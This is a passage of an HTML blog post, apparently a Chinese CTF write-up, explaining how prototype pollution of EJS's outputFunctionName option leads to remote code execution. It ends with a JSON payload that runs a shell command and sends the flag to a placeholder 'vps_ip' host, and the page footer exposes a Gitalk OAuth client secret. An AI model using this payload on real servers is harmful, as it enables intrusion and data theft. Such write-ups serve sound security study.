+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">prepended</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">appended</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">escapeFn</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">escapeFunction</span>;
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ctor</span>;
+
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">source</span>) {
+      <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">generateSource</span>();
+      <span style="color:#a6e22e">prepended</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;  var __output = [], __append = __output.push.bind(__output);&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>;
+      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">outputFunctionName</span>) {
+        <span style="color:#a6e22e">prepended</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;  var &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">outputFunctionName</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; = __append;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>;
+      }
+      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">_with</span> <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
+        <span style="color:#a6e22e">prepended</span> <span style="color:#f92672">+=</span>  <span style="color:#e6db74">&#39;  with (&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">localsName</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; || {}) {&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>;
+        <span style="color:#a6e22e">appended</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;  }&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>;
+      }
+      <span style="color:#a6e22e">appended</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;  return __output.join(&#34;&#34;);&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>;
+      <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">prepended</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">source</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">appended</span>;
+    }
+
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">compileDebug</span>) {
+      <span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;var __line = 1&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>
+        <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;  , __lines = &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">templateText</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>
+        <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;  , __filename = &#39;</span> <span style="color:#f92672">+</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">filename</span> <span style="color:#f92672">?</span>
+        <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">filename</span>) <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;undefined&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>
+        <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;try {&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>
+        <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">source</span>
+        <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;} catch (e) {&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>
+        <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;  rethrow(e, __lines, __filename, __line, escapeFn);&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>
+        <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;}&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>;
+    }
+    <span style="color:#66d9ef">else</span> {
+      <span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">source</span>;
+    }
+
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">client</span>) {
+      <span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;escapeFn = escapeFn || &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">escapeFn</span>.<span style="color:#a6e22e">toString</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">src</span>;
+      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">compileDebug</span>) {
+        <span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;rethrow = rethrow || &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">rethrow</span>.<span style="color:#a6e22e">toString</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">src</span>;
+      }
+    }
+
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">strict</span>) {
+      <span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#34;use strict&#34;;\n&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">src</span>;
+    }
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">debug</span>) {
+      <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">src</span>);
+    }
+
+    <span style="color:#66d9ef">try</span> {
+      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">async</span>) {
+        <span style="color:#75715e">// Have to use generated function for this, since in envs without support,
+</span><span style="color:#75715e"></span>        <span style="color:#75715e">// it breaks in parsing
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">try</span> {
+          <span style="color:#a6e22e">ctor</span> <span style="color:#f92672">=</span> (<span style="color:#66d9ef">new</span> Function(<span style="color:#e6db74">&#39;return (async function(){}).constructor;&#39;</span>))();
+        }
+        <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>) {
+          <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">e</span> <span style="color:#66d9ef">instanceof</span> <span style="color:#a6e22e">SyntaxError</span>) {
+            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> Error(<span style="color:#e6db74">&#39;This environment does not support async/await&#39;</span>);
+          }
+          <span style="color:#66d9ef">else</span> {
+            <span style="color:#66d9ef">throw</span> <span style="color:#a6e22e">e</span>;
+          }
+        }
+      }
+      <span style="color:#66d9ef">else</span> {
+        <span style="color:#a6e22e">ctor</span> <span style="color:#f92672">=</span> Function;
+      }
+      <span style="color:#a6e22e">fn</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ctor</span>(<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">localsName</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;, escapeFn, include, rethrow&#39;</span>, <span style="color:#a6e22e">src</span>);
+    }
+    <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>) {
+      <span style="color:#75715e">// istanbul ignore else
+</span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">e</span> <span style="color:#66d9ef">instanceof</span> <span style="color:#a6e22e">SyntaxError</span>) {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">filename</span>) {
+          <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; in &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">filename</span>;
+        }
+        <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; while compiling ejs\n\n&#39;</span>;
+        <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;If the above error is not helpful, you may want to try EJS-Lint:\n&#39;</span>;
+        <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;https://github.com/RyanZim/EJS-Lint&#39;</span>;
+        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">async</span>) {
+          <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;\n&#39;</span>;
+          <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Or, if you meant to create an async function, pass async: true as an option.&#39;</span>;
+        }
+      }
+      <span style="color:#66d9ef">throw</span> <span style="color:#a6e22e">e</span>;
+    }
+
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">client</span>) {
+      <span style="color:#a6e22e">fn</span>.<span style="color:#a6e22e">dependencies</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">dependencies</span>;
+      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fn</span>;
+    }
+
+    <span style="color:#75715e">// Return a callable function which will execute the function
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// created by the source-code, with the passed data as locals
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Adds a local `include` function which allows full recursive include
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">returnedFn</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">data</span>) {
+      <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">include</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">path</span>, <span style="color:#a6e22e">includeData</span>) {
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">shallowCopy</span>({}, <span style="color:#a6e22e">data</span>);
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">includeData</span>) {
+          <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">shallowCopy</span>(<span style="color:#a6e22e">d</span>, <span style="color:#a6e22e">includeData</span>);
+        }
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">includeFile</span>(<span style="color:#a6e22e">path</span>, <span style="color:#a6e22e">opts</span>)(<span style="color:#a6e22e">d</span>);
+      };
+      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fn</span>.<span style="color:#a6e22e">apply</span>(<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">context</span>, [<span style="color:#a6e22e">data</span> <span style="color:#f92672">||</span> {}, <span style="color:#a6e22e">escapeFn</span>, <span style="color:#a6e22e">include</span>, <span style="color:#a6e22e">rethrow</span>]);
+    };
+    <span style="color:#a6e22e">returnedFn</span>.<span style="color:#a6e22e">dependencies</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">dependencies</span>;
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">returnedFn</span>;
+  }
+}
+</code></pre></div><p>这里存在着使用 <code>new Function()</code> 功能的可能：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">else</span> {
+  <span style="color:#a6e22e">ctor</span> <span style="color:#f92672">=</span> Function;
+}      
+<span style="color:#a6e22e">fn</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ctor</span>(<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">localsName</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;, escapeFn, include, rethrow&#39;</span>, <span style="color:#a6e22e">src</span>);
+</code></pre></div><p>现在需要关注什么能影响 <code>src</code> 这个变量，可以关注函数的前一部分存在着大量变量对 <code>src</code> 变量对赋值操作，而且这些变量可能存在未初始化的可能性的，比如作者提到的 <code>opts.outputFunctionName</code>：</p>
+<blockquote>
+<p>查看ejs的源码，看到下面代码：</p>
+<pre><code>    if (!this.source) {
+      this.generateSource();
+      prepended += '  var __output = [], __append = __output.push.bind(__output);' + '\n';
+      if (opts.outputFunctionName) {
+        prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
+      }
+      if (opts._with !== false) {
+        prepended +=  '  with (' + opts.localsName + ' || {}) {' + '\n';
+        appended += '  }' + '\n';
+      }
+      appended += '  return __output.join(&quot;&quot;);' + '\n';
+      this.source = prepended + this.source + appended;
+    }
+</code></pre></blockquote>
+<p>那么本题的思路也非常明确，利用原型链污染  <code>opts.outputFunctionName</code>，然后利用 ejs compile 过程中动态生成函数的特点构造函数，进而 RCE。</p>
+<p>最后使用的 exp:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+  <span style="color:#f92672">&#34;type&#34;</span>:<span style="color:#e6db74">&#34;test&#34;</span>,
+  <span style="color:#f92672">&#34;content&#34;</span>:{
+    <span style="color:#f92672">&#34;constructor&#34;</span>:{
+      <span style="color:#f92672">&#34;prototype&#34;</span>: {
+        <span style="color:#f92672">&#34;outputFunctionName&#34;</span>:<span style="color:#e6db74">&#34;a=1;const http=process.mainModule.require(&#39;http&#39;);const flag=process.mainModule.require(&#39;child_process&#39;).execSync(&#39;echo $FLAG&#39;).toString();req=http.get(`http://vps_ip/${flag}`);req.end();//&#34;</span>
+      }
+    }
+  }
+}
+</code></pre></div><h2 id="总结">总结</h2>
+<p>该问题实际上还是原型链污染+未初始化变量带来的奇妙化学反应，如果我们能找到一个原型链污染作为切入口，结合一个能影响执行的未初始化变量，就能影响运行的服务，为所欲为。</p>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>syang </span>
+                </p>
+            
+           
+             
+            <p class="copyright-item">
+                    <span>Link:</span>
+                    <a href=https://syang-ng.github.io/2020/04/from-prototype-pollution-to-rce/>https://syang-ng.github.io/2020/04/from-prototype-pollution-to-rce/</span>
+            </p>
+            
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+        <section>
+                <a href="javascript:window.history.back();">back</a></span> · 
+                <span><a href="https://syang-ng.github.io">home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://syang-ng.github.io/2020/04/sp19-asm2vec/" class="prev" rel="prev" title="S&amp;P19 Asm2Vec"><i class="iconfont icon-left"></i>&nbsp;S&amp;P19 Asm2Vec</a>
+         
+        
+    </div>
+
+    <div class="post-comment">
+          
+                 
+          
+          
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script>
+  const gitalk = new Gitalk({
+    clientID: '10b807dd4496d773d0b9',
+    clientSecret: 'c5fe75039eb62db59ca9181aa20ebb0a9a73a1fc',
+    repo: 'syang-ng.github.io',
+    owner: 'syang-ng',
+    admin: ['syang-ng'],
+    id: location.pathname, 
+    distractionFreeMode: false 
+  });
+  (function() {
+    if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+      document.getElementById('gitalk-container').innerHTML = 'Gitalk comments not available by default when the website is previewed locally.';
+      return;
+    }
+    gitalk.render('gitalk-container');
+  })();
+</script>
+
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2017 - 2020</span>
+        
+        <span class="with-love">
+    	 <i class="iconfont icon-love"></i> 
+         </span>
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://syang-ng.github.io">syang</a> | </span> 
+         
+
+         
+		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    
+    <script src="/js/vendor_no_gallery.min.js" async=""></script>
+    
+  
+
+
+
+     </div>
+  </body>
+</html>
